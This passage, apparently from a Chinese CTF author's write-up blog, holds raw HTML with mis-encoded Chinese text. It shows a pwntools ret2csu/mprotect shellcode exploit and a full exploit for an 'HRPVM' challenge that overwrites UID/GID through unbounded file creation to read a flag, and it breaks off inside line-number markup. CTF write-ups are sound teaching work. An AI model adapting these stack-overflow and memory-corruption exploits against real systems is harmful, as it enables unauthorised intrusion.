class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">hard=<span class="number">0x609248</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret_csu</span>(<span class="params">r12, r13, r14, r15, last</span>):</span><br><span class="line">  payload = <span class="number">0x48</span> * <span class="string">&#x27;a&#x27;</span>  </span><br><span class="line">  <span class="comment">#æ„é€ æ ˆæº¢å‡ºçš„padding</span></span><br><span class="line">  payload += p64(<span class="number">0x4062F6</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>    </span><br><span class="line">  <span class="comment">#gadgets1çš„åœ°å€</span></span><br><span class="line">  payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">  <span class="comment">#rbx=0, rbp=1</span></span><br><span class="line">  payload += p64(r12)</span><br><span class="line">  <span class="comment">#callè°ƒç”¨çš„åœ°å€</span></span><br><span class="line">  payload += p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">  <span class="comment">#ä¸‰ä¸ªå‚æ•°çš„å¯„å­˜å™¨</span></span><br><span class="line">  payload += p64(<span class="number">0x4062E0</span>)</span><br><span class="line">  <span class="comment">#gadgets2çš„åœ°å€</span></span><br><span class="line">  payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span></span><br><span class="line">  <span class="comment">#popå‡ºçš„padding</span></span><br><span class="line">  payload += p64(last)</span><br><span class="line">  <span class="comment">#å‡½æ•°æœ€åçš„è¿”å›åœ°å€</span></span><br><span class="line">  <span class="keyword">return</span> payload</span><br><span class="line">mprotect=ret_csu(<span class="number">0x6091E0</span>,<span class="number">0x609000</span>,<span class="number">0x1000</span>,<span class="number">7</span>,rdi)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">pa=mprotect+p64(cin)+p64(rsi)+p64(<span class="number">0x609000</span>)+p64(<span class="number">0</span>)+p64(use_cin)+p64(<span class="number">0x609000</span>)</span><br><span class="line">r.sendline(pa)</span><br><span class="line">r.sendline(asm(shellcraft.cat(<span class="string">&quot;./flag&quot;</span>)))</span><br><span class="line"><span class="comment">#r.sendline(p64(1))</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒç§ï¼Œç›´æ¥è·³è½¬åˆ°0x404EA4æŠŠflagè¯»å‡ºæ¥ è¿™æ˜¯æœ€å¸¸è§çš„æ–¹æ³•</p>
<h4 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h4><p>é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1iTLK3IkVw_a9OqK5kkXO5w?pwd=yrmv" title="https://pan.baidu.com/s/1iTLK3IkVw_a9OqK5kkXO5w?pwd=yrmv">https://pan.baidu.com/s/1iTLK3IkVw_a9OqK5kkXO5w?pwd&#x3D;yrmv</a><br>æå–ç ï¼šyrmv<br>--æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜V4çš„åˆ†äº«</p>
<h3 id="HRPVMğŸ–¥ï¸"><a href="#HRPVMğŸ–¥ï¸" class="headerlink" title="HRPVMğŸ–¥ï¸"></a>HRPVMğŸ–¥ï¸</h3><p>æƒ³å‡ºä¸€äº›æœ‰æ„ä¹‰çš„é¢˜ç›®ï¼Œé¢˜ç›®æ¼æ´è™½ç„¶ç®€å•ï¼Œä½†æ˜¯æ¯”è¾ƒé€‚åˆæ–°äººå»è°ƒè¯•å¸ƒå±€å†…å­˜ï¼Œå‡ºé¢˜ä¸æ˜¯ä¸ºäº†æŠ˜ç£¨é€‰æ‰‹ï¼Œæ˜¯ä¸ºäº†å¤§å®¶éƒ½èƒ½å­¦åˆ°ä¸œè¥¿</p>
<h4 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h4><p>create_fileå‡½æ•°å¯ä»¥æ— é™åˆ›å»ºæ–‡ä»¶æ²¡æœ‰æ£€æŸ¥file_countçš„å¤§å°</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall create_file(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  int v2; // ebx</span><br><span class="line"></span><br><span class="line">  result = check_repeat(a1);</span><br><span class="line">  if ( (_DWORD)result )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_QWORD *)&amp;unk_204130 + 4 * file_count) = global_fd;</span><br><span class="line">    *((_QWORD *)&amp;unk_204128 + 4 * file_count) = a1;</span><br><span class="line">    *((_QWORD *)&amp;HF + 4 * file_count) = 1000LL;</span><br><span class="line">    v2 = file_count;</span><br><span class="line">    *((_QWORD *)&amp;unk_204138 + 4 * v2) = malloc(0x1000uLL);</span><br><span class="line">    printf(&quot;FILE CONTENT: &quot;);</span><br><span class="line">    read(0, *((void **)&amp;unk_204138 + 4 * file_count), 0x1000uLL);</span><br><span class="line">    deleEnter(*((_QWORD *)&amp;unk_204138 + 4 * file_count));</span><br><span class="line">    ++file_count;</span><br><span class="line">    return ++global_fd;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹bssæ®µå‘ç°æ§åˆ¶ç”¨æˆ·æƒé™çš„ç»“æ„ä½“åœ¨æ–‡ä»¶HFçš„ä¸‹é¢</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000204120 ??                            HF db    ? ; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.bss:0000000000204520 ?? ?? ?? ??                   users dd ? </span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨æ€è·¯éå¸¸ç®€å•ï¼Œåˆ›å»º32ä¸ªæ–‡ä»¶åˆšå¥½è¦†ç›–åˆ°usersï¼Œç„¶åé€šè¿‡é€†å‘åˆ†æå¯å¾—ï¼Œusersç»“æ„ä½“çš„ä¸€ä¸ªæ•°æ®å­˜æ”¾çš„æ˜¯UIDå’ŒGIDï¼Œè°ƒè¯•å‘ç°ï¼Œç¬¬32ä¸ªæ–‡ä»¶çš„modeåˆšå¥½å¯ä»¥è¦†ç›–åˆ°UIDå’ŒGIDï¼Œå¹¶ä¸”ç”±äºmodeæ˜¯å¯ä»¥é€šè¿‡ä¼ªæ±‡ç¼–ä¿®æ”¹çš„ï¼Œopenä½¿ç”¨æ–¹æ³•åœ¨ç¨‹åºçš„READMEé‡Œé¢ç…§ç€å†™å°±è¡Œäº†ï¼ŒæŠŠmodeæ”¹æˆ0</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rdi,35;mov rsi,0;call open,2;</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå°±å˜æˆäº†UID&amp;GID&#x3D;&#x3D;0çš„ç”¨æˆ·äº†ï¼Œç°åœ¨å¯ä»¥è¿›å…¥DEBUGæ§åˆ¶å°äº†ã€‚</p>
<p>åˆ†ædebugå‡½æ•°ï¼Œé‡Œé¢ä¸»è¦çš„åŠŸèƒ½å°±æ˜¯file inputå’Œmmapï¼Œmmapå¯ä»¥è‡ªå®šä¹‰æƒé™ä¸º3çš„æŒ‡å®šåœ°å€æ®µã€‚</p>
<p>file inputå¯ä»¥æŠŠç¨‹åºå¤–æŒ‡å®šçš„æ–‡ä»¶æ‹‰å–åˆ°è™šæ‹Ÿæœºå†…ï¼Œæ‹‰å–åé»˜è®¤çš„æƒé™æ¨¡å¼æ˜¯1000ä¹Ÿå°±æ˜¯ä¸å¯è¯»çŠ¶æ€ã€‚æ­¤æ—¶ï¼Œä¸€èˆ¬çš„é€‰æ‰‹å¯èƒ½æƒ³ç€flagæ‹‰è¿›æ¥äº†ç„¶åexitå‡ºdebugå†å»useræ€ç›´æ¥cat å°±å¯ä»¥è·å–flagäº†</p>
<p>ä½†æ˜¯æ³¨æ„ï¼Œexitåç¨‹åºä¼šæŠŠusersç»“æ„ä½“åˆå§‹åŒ–</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deleEnter(buf);</span><br><span class="line">     dword_204524 = <span class="number">1000</span>;</span><br><span class="line">     users = <span class="number">1000</span>;</span><br><span class="line">     <span class="built_in">strncpy</span>(dest, src, <span class="number">8uLL</span>);</span><br><span class="line">     machine_start();</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶UIDå’ŒGIDå˜æˆ1000ï¼Œç„¶ådestè¿™æ¬¡å­˜æ”¾çš„å°±æ˜¯å¼€æœºçš„æ—¶å€™è¦æ±‚è¾“å…¥çš„æŒæœ‰è€…ä¹Ÿæ¸…0äº†ï¼Œé€šè¿‡è°ƒè¯•ä¸éš¾å‘ç°è¿™ä¸ªæŒæœ‰è€…å˜é‡å’Œåˆšæ‰ç¬¬32ä¸ªæ–‡ä»¶çš„å­˜æ”¾æ–‡ä»¶åçš„åœ°å€é‡åˆäº†ï¼Œå› ä¸ºexitè¿™é‡Œè¢«æ¸…0äº†ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„flagå¯æ˜¯åœ¨0x23ä¸ªæ–‡ä»¶çš„ä¸‹é¢ï¼Œå¦‚æœå»cat é‡è§ç¬¬0x23ä¸ªæ–‡ä»¶strcmpæ–‡ä»¶åçš„æ—¶å€™ä¼šå› ä¸ºåœ°å€æ— æ•ˆç¨‹åºå´©æºƒï¼Œä½†æ˜¯æ­¤æ—¶èƒ½è·å–åˆ°å·²çŸ¥å¯è¯»å†™çš„åœ°å€æ–¹æ³•å°±ä¸€ä¸ªï¼Œå°±æ˜¯mmapï¼</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x55a2e6708500 &lt;HF+992&gt;:  0x00000000000003e8  0x000055a2e7e66c00</span><br><span class="line">0x55a2e6708510 &lt;HF+1008&gt;:  0x0000000000000022  0x000055a2e7e66c30</span><br><span class="line">0x55a2e6708520 &lt;users&gt;:  0x000003e8000003e8  0x0000000000000000</span><br><span class="line">0x55a2e6708530 &lt;users+16&gt;:  0x0000000000000023  0x000055a2e7e67c70</span><br><span class="line">0x55a2e6708540 &lt;users+32&gt;:  0x00000000000003e8  0x000055a2e7e68c80</span><br><span class="line">0x55a2e6708550 &lt;users+48&gt;:  0x0000000000000024  0x000055a2e7e68cb0</span><br><span class="line">0x55a2e6708560 &lt;users+64&gt;:  0x00000000000003e8  0x000055a2e7e69cc0</span><br><span class="line">0x55a2e6708570:  0x0000000000000025  0x000055a2e7e69f20</span><br><span class="line">0x55a2e6708580 &lt;REG&gt;:  0x0000000000000023  0x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬mmapè‡ªå®šä¹‰åœ°å€åï¼ˆæˆ‘é€‰æ‹©çš„æ˜¯0x123000ï¼‰ï¼Œè¿˜éœ€è¦æŠŠåœ°å€å¡«å†™åˆ°è¿™ï¼Œå°±åƒæˆ‘ä¸Šé¢åˆ†æçš„ä¸€æ ·é€šè¿‡è°ƒè¯•ä¸éš¾å‘ç°è¿™ä¸ªæŒæœ‰è€…å˜é‡å’Œåˆšæ‰ç¬¬32ä¸ªæ–‡ä»¶çš„å­˜æ”¾æ–‡ä»¶åçš„åœ°å€é‡åˆäº†ï¼Œå”¯ä¸€å¯ä»¥è¾“å…¥è¿™ä¸ªå˜é‡çš„åœ°æ–¹å°±æ˜¯åœ¨å¯åŠ¨æœºå™¨çš„æ—¶å€™ï¼Œåœ¨machine_startå‡½æ•°å¯ä»¥æ‰¾åˆ°rebootåŠŸèƒ½</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( !strncmp(off_2040B8, (const char *)buf, v7) )</span><br><span class="line">   &#123;</span><br><span class="line">     clearScreen();</span><br><span class="line">     boot();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶å¡«å……holderä¸º0x123000å³å¯ï¼Œç­‰åˆ°è™šæ‹Ÿæœºé‡å¯è¿›æ¥åï¼Œå†ç”¨ä¼ªæ±‡ç¼–è°ƒæ•´flagæ–‡ä»¶çš„openæ¨¡å¼å³å¯ç”¨catæŠ“å–</p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./HRPVM&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;HRPHRP&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;PWNME&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;HRP&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">  r.recv()</span><br><span class="line">  r.sendline(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">  r.recv()</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">  r.recv()</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">33</span>))</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&quot;mov rdi,35;mov rsi,0;call open,2;&quot;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;./33&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;file input&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;mmap&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x123000</span>))</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">gdb.attach(r)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;reboot&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;HRPHRP&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;PWNME&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.send(p64(<span class="number">0x123000</span>))</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">39</span>))</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&quot;mov rdi,37;mov rsi,1001;call open,2;&quot;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;./39&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="æºç -1"><a href="#æºç -1" class="headerlink" title="æºç "></a>æºç </h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span 